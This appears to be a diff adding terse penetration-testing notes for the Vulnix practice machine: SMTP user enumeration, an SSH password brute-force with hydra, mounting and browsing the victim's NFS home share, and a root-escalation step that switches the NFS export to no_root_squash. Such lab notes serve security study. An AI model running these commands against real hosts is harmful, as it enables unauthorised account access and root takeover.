@@ -1,0 +1,11 @@
+ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.206.138
+
+
+hydra -l user -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt ssh://192.168.206.138
+
+mount -t nfs <vulnixip>:/home/vulnix /mnt/vulnix
+
+nfspysh -o server=<vulnix ip>:/home/vulnix
+
+update /etc/exportfs - root_squash -> no_root_squash and folder to /root
+
